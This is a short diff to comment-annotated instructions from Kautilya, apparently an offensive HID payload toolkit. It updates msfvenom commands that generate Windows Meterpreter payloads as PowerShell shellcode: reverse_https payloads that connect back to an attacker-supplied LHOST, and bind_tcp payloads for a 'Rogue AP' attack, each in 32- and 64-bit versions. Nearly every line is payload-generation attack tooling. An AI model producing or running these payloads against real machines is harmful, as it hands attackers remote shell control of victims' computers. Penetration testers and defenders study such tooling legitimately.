@@ -3,16 +3,16 @@
 #on exploit-monday blog by Matt and below command is adopted from a comment on the blog.
 #The generated shellcode powershell_codeexec.txt is to be copied to lib/src directory of Kautilya.
 
-./msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> > powershell_codeexec.txt
+./msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> -f powershell > powershell_codeexec.txt
 
 #For 64-bit machines.
-./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> > powershell_codeexec64.txt
+./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> -f powershell > powershell_codeexec64.txt
 
 
 #For Rogue AP payload, use below command. The generated shellcode file should be copied to the src directory of Kautilya.
 #Here LPORT would be the port provided as an option to Kautilya while generating Rogue AP payload.
 
-./msfvenom -p windows/meterpreter/bind_tcp LPORT=<Port> > rogue_ap.txt
+./msfvenom -p windows/meterpreter/bind_tcp LPORT=<Port> -f powershell > rogue_ap.txt
 
 #For 64-bit machines.
-./msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=<Port> > rogue_ap64.txt
+./msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=<Port> -f powershell > rogue_ap64.txt
